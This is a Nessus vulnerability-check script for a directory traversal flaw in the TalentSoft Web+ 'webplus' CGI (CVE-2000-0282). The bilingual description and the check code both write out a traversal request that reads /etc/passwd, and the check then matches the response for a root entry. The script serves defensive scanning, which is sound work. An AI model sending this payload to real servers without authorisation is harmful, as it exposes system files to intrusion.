#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10367);
 script_bugtraq_id(1102);
 script_version ("$Revision: 1.19 $");
 script_cve_id("CVE-2000-0282");
 name["english"] = "TalentSoft Web+ Input Validation Bug Vulnerability";
 name["francais"] = "TalentSoft Web+ Input Validation Bug Vulnerability";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "The 'webplus' CGI allows an attacker
to view any file on the target computer by requesting :

GET /cgi-bin/webplus?script=/../../../../etc/passwd

Solution : remove it

Risk factor : Medium
";

 desc["francais"] = "Le CGI 'webplus' permet à un 
pirate de lire n'importe quel fichier sur la machine cible
au travers de la commande :

GET /cgi-bin/webplus?script=/../../../../etc/passwd

Facteur de risque : Moyen/Elevé

Solution : Supprimez cette page";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks if webplus reads any file";
 summary["francais"] = "Détermine si webplus lit n'importe quel fichier";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
  script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);




if(get_port_state(port))
{
  foreach dir (cgi_dirs())
  {
  req = string(dir, "/webplus?script=/../../../../etc/passwd");
  req = http_get(item:req, port:port);
  result = http_keepalive_send_recv(port:port, data:req);
  if( result == NULL ) exit(0);
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:result))security_warning(port);
  }
}

